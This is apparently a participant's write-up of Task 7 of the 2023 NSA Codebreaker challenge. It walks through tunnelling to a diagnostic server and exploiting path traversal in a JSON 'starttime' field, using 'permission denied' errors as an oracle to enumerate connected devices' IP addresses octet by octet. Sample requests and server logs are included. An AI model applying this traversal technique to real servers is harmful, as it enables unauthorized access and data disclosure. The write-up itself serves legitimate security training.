# 2023 NSA Codebreaker 
#### Task 7 - There is Another - (Reverse Engineering, Exploitation)

```
Intelligence sources indicate with high probably there is a second device somewhere. We don't know where it is physically, but maybe you can find it's IP address somehow. We expect it is one of the up to 2^20 devices connected to the Blue Horizon Mobile network. Blue Horizon Mobile has explained that their internal network is segmented so all user devices are in the 100.64.0.0/12 IP range.

Figure out how the device communicates with the IP you found in the previous task. It must only do so on-demand otherwise we would have probably discovered it sooner. This will probably require some in depth reverse engineering and some guess work. Use what you learn, plus intuition and vulnerability research and exploitation skills to extract information from the server somehow. Your goal is to determine the IP addresses for any devices that connected to the same server. There should be two addresses, one for the downed device, and another for the second device. Your jumpbox account has been updated to allow you to open TCP tunnels to the server (reconnect to enable the new settings). Remember the jumpbox internal IP is 100.127.0.2

```

## Connecting to the server

This task continues from task 6, where we found an IP address. We are utilizing our jumpbox to ssh into the said IP address

I first created an SSH tunnel using the jumpbox:
```
sudo ssh -D 9051 -i jumpbox.key user@external-support.bluehorizonmobile.com
```

The IP address we have to connect to requires a username. The username can be found in one of the binaries we received in task 5 by reverse engineering it with Ghidra:
```
SSH_USERNAME=nonroot_user
BALLOON_ID=<some-uuid>
PRIVATE_KEY_PATH=<path-to-id_ed25519>

export EXPECTED_HOST_KEY=$(cat <expected_host_key>)

# guessing now

SSH_SERVER_ADDRESS
SSH_SERVER_PORT
```

The IP address also requires a ssh key, this is found in the QEMU machine we received in an earlier task.


I used proxychains to send commands on the jumpbox host to communicate with the IP address we found in task 6 using the private key and the ssh username:
```
proxychains ssh -i private_key -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" nonroot_user@100.80.144.142
```

## Solution

Upon running the previous command, we receive what looks to be an initialization for a server that appears to be waiting for data:

```
alexander@MOTHERSHIP:~/Desktop$ proxychains ssh -i private_key -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" nonroot_user@100.80.144.142
ProxyChains-3.1 (http://proxychains.sf.net/)
|D-chain|-<>-127.0.0.1:9051-<>-127.0.0.1:9051-<--timeout
|D-chain|-<>-127.0.0.1:9051-<><>-100.80.144.142:22-<><>-OK
Warning: Permanently added '100.80.144.142' (ED25519) to the list of known hosts.
PTY allocation request failed on channel 0
2023/10/09 04:53:36 Diagnostic Server starting...
2023/10/09 04:53:41 ready
{diagserver} 2023/10/09 04:53:41.071941 Starting connection timer...
```

Proceeding with this challenge past this point requires **a lot** of trial and error. After playing with it for some time, I found that the server only accepts HTTP POST requests to a directory named _/diagnostics_. 

After finding the directory, I found that the server kept telling me that it required a command response with every status update:

```
{diagserver} 2024/01/13 00:13:28.069954 received StatusUpdate without CommandResponse

{"id":"00000000-0000-0000-0000-000000000000","cmd_name":"","cmd_args":null}{diagserver} 2024/01/13 00:13:28.069984 json encoded next command: [123 34 105 100 34 58 34 48 48 48 48 48 48 48 48 45 48 48 48 48 45 48 48 48 48 45 48 48 48 48 45 48 48 48 48 48 48 48 48 48 48 48 48 34 44 34 99 109 100 95 110 97 109 101 34 58 34 34 44 34 99 109 100 95 97 114 103 115 34 58 110 117 108 108 125] err: <nil>

{diagserver} 2024/01/13 00:13:28.070003 Content-Length: 75
{diagserver} 2024/01/13 00:13:28.070007 server to client body: {"id":"00000000-0000-0000-0000-000000000000","cmd_name":"","cmd_args":null}
```
Inspecting the diagserver binary more, I found a CommandResponse struct that I recreated in JSON:

```
struct main.CommandResponse {
    byte Id[16];
    struct string.conflict Starttime;
    struct string.conflict Endtime;
    struct string.conflict Cmd;
    struct string.conflict Stdout;
    struct string.conflict Stderr;
    struct string.conflict Err;
};
```
Finding this, I did craft a POST request similar to this:

```
POST /diagnostics HTTP/1.1
Content-length: 10000


{
  "status_data": {
    "balloon_id": "55899311-b002-483d-a7ba-c1cde03ea2b3"
  },
  "command_response": {
    "id": "55899311-b002-483d-a7ba-c1cde03ea2b3",
    "starttime": "2023-10-09T17:08:41.2260Z",
    "endtime": "2023-10-09T17:13:41.2260Z"
  }
}
```

Here's a similar response I received after sending this:

```
{diagserver} 2023/11/04 18:40:46.319160 Error storing CommandResponse to /diagnostics/var/logs/commands/by-ip/64/7F/00/02/2023/11/04 18:36:55.67755.json: open /diagnostics/var/logs/commands/by-ip/64/7F/00/02/2023/11/04 18:36:55.67755.json: no such file or directory
```

Seeing this response and fuzzing our inputs, I found that the request that we send attempts to store the data into a directory that matches our IP address. The challenge states that we have to find 2 IP addresses that have connected to this server. 

Drawing some inferences and doing more fuzzing, I figured out that I needed to find a directory that exists using directory traversal in our _starttime_ field. A directory that exists is defined as a response with the words "permission denied".

```
2023/11/04 19:13:56 Diagnostic Server starting...
2023/11/04 19:14:01 ready
{diagserver} 2023/11/04 19:14:01.150118 Starting connection timer...
{diagserver} 2023/11/04 19:14:01.150285 received StatusUpdate with CommandResponse
{diagserver} 2023/11/04 19:14:01.150338 Error storing CommandResponse to /diagnostics/var/logs/commands/by-ip/64/7F/00/02/../aaaaaaaaaaaaaaaaaaaaaa.json: open /diagnostics/var/logs/commands/by-ip/64/7F/00/02/../aaaaaaaaaaaaaaaaaaaaaa.json: permission denied
{diagserver} 2023/11/04 19:14:01.150353 HTTP/1.1 500 Internal Server Error
{diagserver} 2023/11/04 19:14:01.150360 Content-Length: 0
{diagserver} 2023/11/04 19:14:01.150365 server to client body:
{diagserver} 2023/11/04 19:14:01.233391 EOF
```

Within the challenge, we are given a subnet with which the two IP addresses are that we need to find. If we create a script that repeatedly sends post requests to every ip address, this is going to take a VERY long time. 

Explained simply, we will start with the first octet and iterate over 255 possible numbers via directory traversal to find the FIRST OCTET of the two ip addresses. For the 2 returned "permission denied" responses, we add the octet that returned a "persmission denied" to our directory traversal and move to the next octet until we find the full ip addresses.

My spaghetti code for this process is within this repository!
